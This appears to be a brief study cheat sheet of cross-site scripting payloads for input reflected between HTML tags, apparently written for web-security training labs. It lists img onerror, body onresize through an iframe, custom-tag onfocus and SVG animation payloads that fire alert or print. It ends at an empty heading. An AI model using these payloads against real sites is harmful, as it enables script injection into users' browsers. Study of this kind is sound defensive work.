# Between HTML tags
## Exploits
- `<img src=1 onerror=alert(1)>`
- `<img src=1 onerror=alert(1)>`
- `<body onresize=print(1)>`
  `<iframe src="https://academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width='1200px'>`
- `<superman onfocus='alert(1)' id='x' tabindex='1'>`, 
  `https://abc.com?search=%3Csuper-man+onfocus%3D%27alert%281%29%27+id%3D%27x%27+tabindex%3D1%3E#x`
- `<svg><a><animate attributeName=href values=javascript:alert(1) /><text>Click me</text>`
- `<svg><animatetransform onbegin=alert(1) attributeName=transform>`


```js
<h1> Your search result 'ControlledValue' </h1>
<p>ControlledValue</p>
<h1></h1>
<h1></h1>
<h1></h1>
<h1></h1>
```

## Inside tag attributes